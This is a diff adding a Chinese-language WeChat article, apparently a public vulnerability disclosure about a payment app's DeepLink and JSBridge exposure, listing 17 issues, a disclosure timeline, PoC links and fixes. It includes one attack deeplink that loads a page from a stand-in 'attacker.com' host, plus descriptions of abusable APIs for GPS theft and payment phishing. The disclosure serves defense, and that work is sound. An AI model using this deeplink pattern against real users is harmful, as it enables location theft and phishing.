@@ -1,0 +1,382 @@
+<!--
+  微信公众号文章 HTML
+  标题：点一下链接，GPS就被偷了 —— 某国民级支付App 17个安全漏洞遭曝光
+  作者：Innora AI 安全研究
+  日期：2026-03-11
+
+  使用说明：
+  1. 复制 <section id="article"> 内的全部内容
+  2. 粘贴到微信公众号编辑器的"HTML模式"
+  3. 切换回可视化模式检查排版
+  4. 发布
+-->
+<section id="article">
+
+<!-- 标题区域 -->
+<section style="padding:20px 16px 0;text-align:center;">
+  <p style="font-size:11px;color:#999;letter-spacing:2px;margin-bottom:8px;">INNORA AI 安全研究</p>
+</section>
+
+<!-- 全文链接入口 - 红色醒目 -->
+<section style="margin:16px;padding:16px 20px;background:#fff5f5;border-left:4px solid #ff4444;border-radius:0 8px 8px 0;">
+  <p style="font-size:15px;font-weight:700;color:#ff4444;margin-bottom:8px;">📌 完整技术报告（含在线 PoC 演示）</p>
+  <p style="font-size:14px;color:#333;margin-bottom:4px;">
+    🌐 <strong>研究主站</strong>：<a href="https://innora.ai/zfb/" style="color:#1a6dff;font-weight:700;">https://innora.ai/zfb/</a>
+  </p>
+  <p style="font-size:14px;color:#333;margin-bottom:4px;">
+    🐙 <strong>GitHub 仓库</strong>：<a href="https://github.com/sgInnora/alipay-deeplink-research" style="color:#1a6dff;font-weight:700;">github.com/sgInnora/alipay-deeplink-research</a>
+  </p>
+  <p style="font-size:12px;color:#ff4444;margin-bottom:0;font-weight:600;">⚠️ 为防删除，请自行 Fork 仓库或保存页面到本地备份！</p>
+</section>
+
+<!-- 分割线 -->
+<section style="text-align:center;margin:24px 0;"><p style="color:#ddd;font-size:20px;letter-spacing:8px;">· · ·</p></section>
+
+<!-- 引言 -->
+<section style="margin:0 16px 24px;">
+  <p style="font-size:15px;line-height:2;color:#333;">
+    2026年3月7日，我们向某头部支付平台提交了一份包含 <strong style="color:#ff4444;">17个安全漏洞</strong> 的完整研究报告，附带 308 条服务器日志和 42 张真机截图作为证据。
+  </p>
+  <p style="font-size:15px;line-height:2;color:#333;">
+    厂商的回复只有四个字：<strong style="color:#ff4444;font-size:18px;">「正常功能」</strong>。
+  </p>
+  <p style="font-size:15px;line-height:2;color:#333;">
+    我们决定公开全部研究成果。
+  </p>
+</section>
+
+<!-- 小标题：攻击只需一步 -->
+<section style="margin:0 16px 20px;">
+  <p style="font-size:20px;font-weight:800;color:#1a1a1a;border-bottom:3px solid #ff4444;display:inline-block;padding-bottom:4px;">攻击只需一步：点击一个链接</p>
+</section>
+
+<section style="margin:0 16px 24px;">
+  <p style="font-size:15px;line-height:2;color:#333;">
+    不需要 Root。不需要越狱。不需要任何特殊权限。
+  </p>
+  <p style="font-size:15px;line-height:2;color:#333;">
+    受害者只需要做一件事 —— <strong>在微信、QQ 或短信中点击一个链接</strong>。
+  </p>
+  <p style="font-size:15px;line-height:2;color:#333;">
+    这个链接会通过 DeepLink 协议直接打开目标支付App，在其内置浏览器中加载攻击者的网页。而这个网页，可以调用 App 内部的 JavaScript Bridge 接口 —— <strong style="color:#ff4444;">无需任何额外授权</strong>。
+  </p>
+</section>
+
+<!-- 攻击链图 -->
+<section style="margin:0 16px 24px;">
+  <div style="background:#f8f9fa;border-radius:8px;padding:16px;font-family:Menlo,monospace;font-size:13px;line-height:1.8;color:#333;overflow-x:auto;">
+    <p style="margin-bottom:4px;">📱 攻击流程：</p>
+    <p style="margin-bottom:2px;color:#666;">攻击者发送链接 (伪装成红包/活动)</p>
+    <p style="margin-bottom:2px;">　　↓</p>
+    <p style="margin-bottom:2px;color:#666;">受害者点击 → 浏览器解析 DeepLink</p>
+    <p style="margin-bottom:2px;">　　↓</p>
+    <p style="margin-bottom:2px;color:#666;">支付App自动启动 → 加载攻击者页面</p>
+    <p style="margin-bottom:2px;">　　↓</p>
+    <p style="margin-bottom:2px;color:#ff4444;font-weight:700;">JSBridge 全部开放 → 数据被窃取</p>
+  </div>
+</section>
+
+<!-- 小标题：能偷什么？ -->
+<section style="margin:0 16px 20px;">
+  <p style="font-size:20px;font-weight:800;color:#1a1a1a;border-bottom:3px solid #ff4444;display:inline-block;padding-bottom:4px;">能窃取什么？</p>
+</section>
+
+<!-- CRITICAL -->
+<section style="margin:0 16px 16px;">
+  <div style="background:#fff5f5;border-left:4px solid #ff4444;border-radius:0 8px 8px 0;padding:14px 16px;">
+    <p style="font-size:12px;font-weight:700;color:#ff4444;margin-bottom:8px;letter-spacing:1px;">🔴 CRITICAL — 严重</p>
+    <p style="font-size:15px;line-height:1.8;color:#333;margin-bottom:8px;">
+      <strong>1. GPS 实时定位窃取</strong><br>
+      <span style="color:#666;font-size:14px;">调用 getLocation 接口，静默获取经纬度、城市、国家。当用户曾授予App定位权限时，外部攻击页面可直接获取，不会弹出任何授权提示。</span>
+    </p>
+    <p style="font-size:15px;line-height:1.8;color:#333;margin-bottom:8px;">
+      <strong>2. 转账页面预填充</strong><br>
+      <span style="color:#666;font-size:14px;">调用 startApp 打开转账功能并预填金额和收款账户。最终确认仍需用户操作，但在 UI 欺骗场景下可诱导用户完成。</span>
+    </p>
+    <p style="font-size:15px;line-height:1.8;color:#333;margin-bottom:0;">
+      <strong>3. 支付接口调用</strong><br>
+      <span style="color:#666;font-size:14px;">调用 tradePay 接口可弹出支付确认页。用户取消后返回 resultCode=6001，但攻击者可反复触发，配合 UI 伪装进行钓鱼。</span>
+    </p>
+  </div>
+</section>
+
+<!-- HIGH -->
+<section style="margin:0 16px 16px;">
+  <div style="background:#fff8f0;border-left:4px solid #ff8c00;border-radius:0 8px 8px 0;padding:14px 16px;">
+    <p style="font-size:12px;font-weight:700;color:#ff8c00;margin-bottom:8px;letter-spacing:1px;">🟠 HIGH — 高危</p>
+    <p style="font-size:15px;line-height:1.8;color:#333;margin-bottom:8px;">
+      <strong>4. 设备完整指纹</strong><br>
+      <span style="color:#666;font-size:14px;">品牌、型号、系统版本、存储、电量、屏幕分辨率、蓝牙/WiFi/摄像头/麦克风授权状态 —— 一次全部泄露。</span>
+    </p>
+    <p style="font-size:15px;line-height:1.8;color:#333;margin-bottom:8px;">
+      <strong>5. 标题栏欺骗</strong><br>
+      <span style="color:#666;font-size:14px;">调用 setTitle 将标题栏改为「账户安全中心」，配合 Toast 弹窗伪造系统通知。用户无法区分真假界面。</span>
+    </p>
+    <p style="font-size:15px;line-height:1.8;color:#333;margin-bottom:0;">
+      <strong>6. 敏感页面直达</strong><br>
+      <span style="color:#666;font-size:14px;">通过 startApp 直接跳转至交易记录、转账联系人、付款码、余额、安全设置、银行卡管理等 11 个敏感页面，无额外确认。</span>
+    </p>
+  </div>
+</section>
+
+<!-- MEDIUM -->
+<section style="margin:0 16px 16px;">
+  <div style="background:#f0f7ff;border-left:4px solid #4488ff;border-radius:0 8px 8px 0;padding:14px 16px;">
+    <p style="font-size:12px;font-weight:700;color:#4488ff;margin-bottom:8px;letter-spacing:1px;">🔵 MEDIUM — 中危</p>
+    <p style="font-size:15px;line-height:1.8;color:#333;margin-bottom:8px;">
+      <strong>7-9. 网络信息 / 会话泄露 / 服务器时间同步</strong><br>
+      <span style="color:#666;font-size:14px;">WiFi/蜂窝状态、sessionId、sourcePackageName（知道你从哪来的），以及支付宝服务器精确时间。</span>
+    </p>
+    <p style="font-size:15px;line-height:1.8;color:#333;margin-bottom:8px;">
+      <strong>10-13. 链式 WebView / Scheme 注入</strong><br>
+      <span style="color:#666;font-size:14px;">pushWindow 可以无限打开新页面，每个页面都自动获得完整 JSBridge 权限。还可注入 tel: / sms: 协议触发拨号和短信。</span>
+    </p>
+    <p style="font-size:15px;line-height:1.8;color:#333;margin-bottom:0;">
+      <strong>14-17. 剪贴板操作 / 联系人选择 / 分享劫持</strong><br>
+      <span style="color:#666;font-size:14px;">读写剪贴板、弹出联系人选择器、触发分享面板 —— 全部可从外部页面调用。</span>
+    </p>
+  </div>
+</section>
+
+<!-- 分割线 -->
+<section style="text-align:center;margin:24px 0;"><p style="color:#ddd;font-size:20px;letter-spacing:8px;">· · ·</p></section>
+
+<!-- 小标题：证据 -->
+<section style="margin:0 16px 20px;">
+  <p style="font-size:20px;font-weight:800;color:#1a1a1a;border-bottom:3px solid #ff4444;display:inline-block;padding-bottom:4px;">真机实测证据</p>
+</section>
+
+<section style="margin:0 16px 24px;">
+  <p style="font-size:15px;line-height:2;color:#333;">
+    我们在 <strong>3 台不同设备、3 个不同国家</strong> 进行了交叉验证：
+  </p>
+
+  <div style="background:#f8f9fa;border-radius:8px;padding:14px 16px;margin-bottom:12px;">
+    <p style="font-size:14px;color:#333;margin-bottom:6px;">📱 <strong>Samsung S25 Ultra</strong> — Android 15, 新西兰</p>
+    <p style="font-size:14px;color:#333;margin-bottom:6px;">📱 <strong>Redmi 12</strong> — Android 14, 马来西亚</p>
+    <p style="font-size:14px;color:#333;margin-bottom:0;">📱 <strong>iPhone 16 Pro</strong> — iOS 18.3, 中国大陆</p>
+  </div>
+
+  <p style="font-size:15px;line-height:2;color:#333;">
+    共获取 <strong style="color:#ff4444;">308 条</strong> 服务器端数据日志，<strong style="color:#ff4444;">42 张</strong> 真机截图。攻击者页面成功从这三台设备上静默获取了 GPS 坐标、设备指纹、网络信息等敏感数据。
+  </p>
+  <p style="font-size:15px;line-height:2;color:#333;">
+    服务器日志示例：
+  </p>
+  <div style="background:#1a1a2e;border-radius:8px;padding:14px 16px;font-family:Menlo,monospace;font-size:12px;line-height:1.6;color:#44cc88;overflow-x:auto;">
+    <p style="margin-bottom:4px;color:#888;">// 真实日志摘录 (已脱敏)</p>
+    <p style="margin-bottom:2px;">{</p>
+    <p style="margin-bottom:2px;">  "tag": "GPS_Location",</p>
+    <p style="margin-bottom:2px;">  "data": {</p>
+    <p style="margin-bottom:2px;">    "latitude": "-36.8***",</p>
+    <p style="margin-bottom:2px;">    "longitude": "174.7***",</p>
+    <p style="margin-bottom:2px;">    "city": "Auckland",</p>
+    <p style="margin-bottom:2px;">    "country": "NZ"</p>
+    <p style="margin-bottom:2px;">  },</p>
+    <p style="margin-bottom:2px;">  "device": "SM-S938B",</p>
+    <p style="margin-bottom:2px;">  "timestamp": "2026-03-07T09:14:22Z"</p>
+    <p style="margin-bottom:0;">}</p>
+  </div>
+</section>
+
+<!-- 分割线 -->
+<section style="text-align:center;margin:24px 0;"><p style="color:#ddd;font-size:20px;letter-spacing:8px;">· · ·</p></section>
+
+<!-- 小标题：负责任披露 -->
+<section style="margin:0 16px 20px;">
+  <p style="font-size:20px;font-weight:800;color:#1a1a1a;border-bottom:3px solid #ff4444;display:inline-block;padding-bottom:4px;">负责任披露时间线</p>
+</section>
+
+<section style="margin:0 16px 24px;">
+  <div style="border-left:3px solid #ddd;padding-left:16px;">
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:8px;">
+      <strong style="color:#4488ff;">2026-02-25</strong> —— 首次报告 (TLS/SSL 发现) → 官方 SRC 邮箱
+    </p>
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:8px;">
+      <strong style="color:#4488ff;">2026-03-07</strong> —— 完整 V3 报告 (17漏洞 + 308日志 + 42截图) → 安全联系人
+    </p>
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:8px;">
+      <strong style="color:#ff4444;">2026-03-08</strong> —— 厂商回复：<strong style="color:#ff4444;">「根据我们的评估这些属于正常功能」</strong>
+    </p>
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:0;">
+      <strong style="color:#ff4444;">2026-03-11</strong> —— 公开披露
+    </p>
+  </div>
+</section>
+
+<section style="margin:0 16px 24px;">
+  <div style="background:#fff5f5;border-radius:8px;padding:16px;border:1px solid #ffcccc;">
+    <p style="font-size:15px;line-height:2;color:#333;">
+      我们理解厂商有自己的风险评估标准。但当一个外部网页可以在 App 内静默获取用户 GPS 定位、伪造应用界面进行钓鱼、甚至预填转账信息时，将其定性为「正常功能」，<strong style="color:#ff4444;">我们无法认同</strong>。
+    </p>
+    <p style="font-size:15px;line-height:2;color:#333;margin-bottom:0;">
+      公开披露不是为了对抗，而是为了让更多安全研究人员和用户知情，共同推动问题解决。
+    </p>
+  </div>
+</section>
+
+<!-- 分割线 -->
+<section style="text-align:center;margin:24px 0;"><p style="color:#ddd;font-size:20px;letter-spacing:8px;">· · ·</p></section>
+
+<!-- 小标题：PoC -->
+<section style="margin:0 16px 20px;">
+  <p style="font-size:20px;font-weight:800;color:#1a1a1a;border-bottom:3px solid #ff4444;display:inline-block;padding-bottom:4px;">在线 PoC 演示（只读，不收集数据）</p>
+</section>
+
+<section style="margin:0 16px 24px;">
+  <p style="font-size:15px;line-height:2;color:#333;margin-bottom:16px;">
+    我们提供了三个在线 PoC 页面，所有数据仅在本地展示，不会传输至任何服务器：
+  </p>
+
+  <div style="background:#f8f9fa;border-radius:8px;padding:14px 16px;margin-bottom:10px;border:1px solid #e0e0e0;">
+    <p style="font-size:14px;color:#333;margin-bottom:4px;">
+      <strong>🎯 Trigger Page</strong> — 模拟攻击者分发页面
+    </p>
+    <p style="font-size:13px;color:#1a6dff;margin-bottom:0;">
+      <a href="https://innora.ai/zfb/poc/trigger.html" style="color:#1a6dff;">innora.ai/zfb/poc/trigger.html</a>
+    </p>
+  </div>
+
+  <div style="background:#f8f9fa;border-radius:8px;padding:14px 16px;margin-bottom:10px;border:1px solid #e0e0e0;">
+    <p style="font-size:14px;color:#333;margin-bottom:4px;">
+      <strong>🔓 JSBridge PoC</strong> — 演示外部页面的 API 访问能力
+    </p>
+    <p style="font-size:13px;color:#1a6dff;margin-bottom:0;">
+      <a href="https://innora.ai/zfb/poc/verify.html" style="color:#1a6dff;">innora.ai/zfb/poc/verify.html</a>
+    </p>
+  </div>
+
+  <div style="background:#f8f9fa;border-radius:8px;padding:14px 16px;margin-bottom:0;border:1px solid #e0e0e0;">
+    <p style="font-size:14px;color:#333;margin-bottom:4px;">
+      <strong>🔗 Chain WebView</strong> — 证明链式页面仍保留完整 Bridge 权限
+    </p>
+    <p style="font-size:13px;color:#1a6dff;margin-bottom:0;">
+      <a href="https://innora.ai/zfb/poc/chain.html" style="color:#1a6dff;">innora.ai/zfb/poc/chain.html</a>
+    </p>
+  </div>
+</section>
+
+<!-- 分割线 -->
+<section style="text-align:center;margin:24px 0;"><p style="color:#ddd;font-size:20px;letter-spacing:8px;">· · ·</p></section>
+
+<!-- 小标题：为什么公开 -->
+<section style="margin:0 16px 20px;">
+  <p style="font-size:20px;font-weight:800;color:#1a1a1a;border-bottom:3px solid #ff4444;display:inline-block;padding-bottom:4px;">为什么选择公开？</p>
+</section>
+
+<section style="margin:0 16px 24px;">
+  <p style="font-size:15px;line-height:2;color:#333;">
+    我们完全遵循了负责任披露流程 —— 先私下报告，等待厂商响应。厂商明确回复这些是「正常功能」，表示不会修复。
+  </p>
+  <p style="font-size:15px;line-height:2;color:#333;">
+    在这种情况下，公开是唯一能推动改变的方式。我们希望：
+  </p>
+  <div style="background:#f0f7ff;border-radius:8px;padding:14px 16px;">
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:6px;">1️⃣ 用户知道自己的隐私正在被「正常功能」暴露</p>
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:6px;">2️⃣ 安全研究社区可以独立验证我们的发现</p>
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:6px;">3️⃣ 厂商重新审视这些问题的严重性</p>
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:0;">4️⃣ 整个行业认真对待 DeepLink 攻击面</p>
+  </div>
+</section>
+
+<!-- 分割线 -->
+<section style="text-align:center;margin:24px 0;"><p style="color:#ddd;font-size:20px;letter-spacing:8px;">· · ·</p></section>
+
+<!-- 重要澄清 -->
+<section style="margin:0 16px 24px;">
+  <div style="background:#fffbe6;border:2px solid #faad14;border-radius:8px;padding:16px;">
+    <p style="font-size:16px;font-weight:800;color:#d48806;margin-bottom:8px;">⚠️ 重要澄清</p>
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:8px;">
+      <strong>本研究未发现零交互自动扣款漏洞。</strong>转账预填充仍需用户手动确认。GPS 获取依赖于用户此前已授予该App定位权限。
+    </p>
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:0;">
+      核心风险在于：<strong>任何外部HTTPS网页</strong>通过 DeepLink 加载后，可以调用大量本应仅限于官方小程序使用的内部接口，且无需额外授权。这将传统钓鱼攻击的杀伤力提升了一个数量级。
+    </p>
+  </div>
+</section>
+
+<!-- 技术细节概要 -->
+<section style="margin:0 16px 20px;">
+  <p style="font-size:20px;font-weight:800;color:#1a1a1a;border-bottom:3px solid #ff4444;display:inline-block;padding-bottom:4px;">技术要点</p>
+</section>
+
+<section style="margin:0 16px 24px;">
+  <p style="font-size:15px;line-height:2;color:#333;margin-bottom:12px;">
+    攻击的核心入口是 DeepLink URI scheme：
+  </p>
+  <div style="background:#1a1a2e;border-radius:8px;padding:12px 16px;font-family:Menlo,monospace;font-size:13px;color:#44cc88;margin-bottom:16px;overflow-x:auto;">
+    <p style="margin:0;">alipays://platformapi/startapp?appId=20000067&url=https://attacker.com/evil.html</p>
+  </div>
+  <p style="font-size:15px;line-height:2;color:#333;">
+    其中 <code style="background:#f5f5f5;padding:2px 6px;border-radius:3px;font-size:13px;color:#d14;">appId=20000067</code> 是内置浏览器组件。任何 HTTPS URL 都可以通过这个方式在 App 的 WebView 容器中打开，而 WebView 会自动注入 <code style="background:#f5f5f5;padding:2px 6px;border-radius:3px;font-size:13px;color:#d14;">AlipayJSBridge</code> 对象，提供 50+ 个内部 API。
+  </p>
+  <p style="font-size:15px;line-height:2;color:#333;">
+    更详细的攻击链分析、每个 API 的调用代码、服务器日志原文，请参阅完整报告。
+  </p>
+</section>
+
+<!-- 分割线 -->
+<section style="text-align:center;margin:24px 0;"><p style="color:#ddd;font-size:20px;letter-spacing:8px;">· · ·</p></section>
+
+<!-- 多节点存档 - 醒目红色 -->
+<section style="margin:0 16px 24px;">
+  <div style="background:#ff4444;border-radius:12px;padding:20px;text-align:center;">
+    <p style="font-size:18px;font-weight:800;color:#fff;margin-bottom:12px;">🛡️ 多节点存档（防删除）</p>
+    <p style="font-size:14px;color:#ffe0e0;margin-bottom:16px;">
+      本研究已在多个独立节点同步发布。如发现任一地址不可访问，请从其他节点获取。
+    </p>
+    <div style="background:rgba(255,255,255,.15);border-radius:8px;padding:12px 16px;margin-bottom:8px;">
+      <p style="font-size:14px;color:#fff;margin-bottom:0;">
+        🌐 <strong>研究主站</strong>：<a href="https://innora.ai/zfb/" style="color:#ffe0e0;text-decoration:underline;">https://innora.ai/zfb/</a>
+      </p>
+    </div>
+    <div style="background:rgba(255,255,255,.15);border-radius:8px;padding:12px 16px;margin-bottom:8px;">
+      <p style="font-size:14px;color:#fff;margin-bottom:0;">
+        🐙 <strong>GitHub</strong>：<a href="https://github.com/sgInnora/alipay-deeplink-research" style="color:#ffe0e0;text-decoration:underline;">github.com/sgInnora/alipay-deeplink-research</a>
+      </p>
+    </div>
+    <p style="font-size:13px;color:#ffcccc;margin-bottom:0;font-weight:600;">
+      ⚠️ 请 Fork GitHub 仓库 / 保存页面到本地 / 转发本文，帮助保留证据！
+    </p>
+  </div>
+</section>
+
+<!-- 修复建议 -->
+<section style="margin:0 16px 20px;">
+  <p style="font-size:20px;font-weight:800;color:#1a1a1a;border-bottom:3px solid #4488ff;display:inline-block;padding-bottom:4px;">修复建议</p>
+</section>
+
+<section style="margin:0 16px 24px;">
+  <p style="font-size:15px;line-height:2;color:#333;margin-bottom:12px;">
+    我们同时提供了完整的修复建议方案：
+  </p>
+  <div style="background:#f0f7ff;border-radius:8px;padding:14px 16px;">
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:6px;">🔒 <strong>URL 白名单</strong>：仅允许官方域名通过 appId=20000067 加载</p>
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:6px;">🔒 <strong>JSBridge 分级</strong>：外部页面仅开放基础 API，敏感接口需域名+签名验证</p>
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:6px;">🔒 <strong>DeepLink 确认</strong>：外部来源的 DeepLink 必须弹出安全确认弹窗</p>
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:6px;">🔒 <strong>位置权限</strong>：WebView 中的 getLocation 应独立于系统权限，需显式授权</p>
+    <p style="font-size:14px;line-height:2;color:#333;margin-bottom:0;">🔒 <strong>UI 隔离</strong>：外部页面禁止 setTitle/toast，或添加不可欺骗的安全标识</p>
+  </div>
+</section>
+
+<!-- 分割线 -->
+<section style="text-align:center;margin:24px 0;"><p style="color:#ddd;font-size:20px;letter-spacing:8px;">· · ·</p></section>
+
+<!-- 法律声明 -->
+<section style="margin:0 16px 24px;">
+  <div style="background:#f8f9fa;border-radius:8px;padding:14px 16px;border:1px solid #e0e0e0;">
+    <p style="font-size:13px;color:#999;line-height:1.8;margin-bottom:0;">
+      <strong>法律声明</strong>：本研究仅用于安全教育目的。所有测试在研究者自有账户和设备上进行，未对第三方账户或数据进行未授权访问。PoC 页面为只读演示，已禁用所有数据外传功能。本研究遵循负责任披露流程，厂商已获得充分时间响应。
+    </p>
+  </div>
+</section>
+
+<!-- 作者信息 -->
+<section style="margin:0 16px 32px;text-align:center;">
+  <p style="font-size:14px;color:#333;margin-bottom:4px;"><strong>Innora AI 安全研究团队</strong></p>
+  <p style="font-size:13px;color:#999;margin-bottom:4px;">feng@innora.ai</p>
+  <p style="font-size:13px;color:#999;margin-bottom:8px;">2026-03-11</p>
+  <p style="font-size:12px;color:#bbb;margin-bottom:0;">— END —</p>
+</section>
+
+</section>
